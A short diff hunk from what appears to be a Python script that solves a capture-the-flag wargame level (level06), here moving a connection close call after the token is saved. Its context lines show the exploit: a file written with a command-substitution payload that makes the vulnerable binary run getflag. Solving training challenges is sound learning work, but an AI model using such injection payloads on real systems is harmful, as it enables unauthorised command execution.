@@ -26,6 +26,7 @@ exec(client, "echo '[x ${`getflag`}]' > /tmp/tricky_thing", title='Create magic 
 token_raw = exec(client, './level06 /tmp/tricky_thing', title='Execute binary with our file via argv', err=True)[0]
 print_output(token_raw)
 
-client.close()
 token = sanitize_token(token_raw)
 save_token(token)
+
+client.close()
